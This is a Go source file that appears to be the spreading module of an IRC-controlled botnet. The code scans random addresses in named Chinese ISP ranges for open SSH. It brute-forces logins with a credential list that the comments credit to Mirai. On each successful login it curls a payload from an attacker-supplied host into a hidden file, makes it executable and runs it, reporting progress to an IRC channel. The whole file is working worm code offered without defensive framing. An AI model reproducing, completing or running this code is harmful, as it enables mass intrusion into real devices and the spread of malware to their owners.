package pkg

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var Scan_Switch bool

const (
	//CHINANET Hubei province network.
	chpn1 = "116.211" //116.211.255.255
	chpn2 = "119."    //119.96.0.0 - 119.97.255.255
	chpn3 = "119.102" //119.102.255.255
	chpn4 = "58.49"   //58.49.255.255
	chpn5 = "58.53"   //58.53.255.255
	chpn6 = "221."    //221.234.0.0 - 221.235.255.255

	//CHINANET Guangdong province network.
	cgpn1 = "14.116" //14.116.255.255
	cgpn2 = "14.118" //14.118.255.255
	cgpn3 = "14.127" //14.127.255.255
	cgpn4 = "121.14" //121.14.255.255
)

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func manageIP_range(mainRange, setRange string) string {
	var ipGen []string
	ipGen = append(ipGen, mainRange)
	ipGen = append(ipGen, setRange, ".")

	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, genRange(255, 0), ".")
	}

	ipGen[len(ipGen)-1] = ""
	ipGen = append(ipGen, ":22")
	return ipGen[0] + ipGen[1] + ipGen[2] + ipGen[3] +
		ipGen[4] + ipGen[5] + ipGen[6] + ipGen[7]
}

func nextIP(ipRange string) string {
	switch ipRange {
	case chpn1:
		return manageIP_range(ipRange, "")
	case chpn2:
		return manageIP_range(ipRange, genRange(97, 96))
	case chpn3:
		return manageIP_range(ipRange, "")
	case chpn4:
		return manageIP_range(ipRange, "")
	case chpn5:
		return manageIP_range(ipRange, "")
	case chpn6:
		return manageIP_range(ipRange, genRange(235, 234))
	case cgpn1:
		return manageIP_range(ipRange, "")
	case cgpn2:
		return manageIP_range(ipRange, "")
	case cgpn3:
		return manageIP_range(ipRange, "")
	case cgpn4:
		return manageIP_range(ipRange, "")
	}
	return ""
}

func checkPort(_ipRange string) string {
	ptrIP := &_ipRange
	conn, err := net.DialTimeout("tcp", *ptrIP, 1*time.Second)
	if err != nil {
		return ""
	}
	conn.Close()
	return *ptrIP
}

func ssh_config(ssh_name, ssh_pass string) *ssh.ClientConfig {
	config := &ssh.ClientConfig{
		User: ssh_name,
		Auth: []ssh.AuthMethod{
			ssh.Password(ssh_pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return config
}

func ssh_session(ssh_session *ssh.Client, command string) {
	session, _ := ssh_session.NewSession()
	var set_session bytes.Buffer
	session.Stdout = &set_session
	session.Run(command)
	session.Close()
}

func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
	NetList := []string{
		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
		cgpn1, cgpn2, cgpn3, cgpn4,
	}

	/*
		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
		Add more usernames and passwords in to The slice name "userList" and "passList".
	*/
	userList := []string{
		"admin", "root", "user", "guest", "support", "login",
	}

	passList := []string{
		"", "admin", "root", "user", "guest", "support", "login", "password",
		"default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass",
		"54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111",
		"ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234", "jvbzd",
		"klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin", "7ujMko0vizxv",
	}

	for {
		for net := range NetList {
			target := nextIP(NetList[net])
			ptrTarget := &target
			turnRange := checkPort(*ptrTarget)

			if turnRange == "" {
				checkPort(target)
			} else {
				IRC_Report(reportIRC, set_chan, "Try to login to "+turnRange)
				var logCheck bool

				for user := range userList {
					for pass := range passList {
						_session, err := ssh.Dial("tcp", turnRange, ssh_config(userList[user], passList[pass]))
						if err == nil {
							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
							ssh_session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
							IRC_Report(reportIRC, set_chan, "\"curl\" Success on "+turnRange)
							time.Sleep(10 * time.Second)
							ssh_session(_session, "chmod +x ."+set_payload)
							go ssh_session(_session, "./."+set_payload+" &")
							logCheck = true
							break
						} else {
							IRC_Report(reportIRC, set_chan, "Failed to login to "+
								turnRange+" > "+fmt.Sprintf("%v:%v", userList[user], passList[pass]))
						}
					}
					if logCheck || Scan_Switch {
						break
					}
				}
				continue
			}
		}
		if Scan_Switch {
			break
		}
	}
}
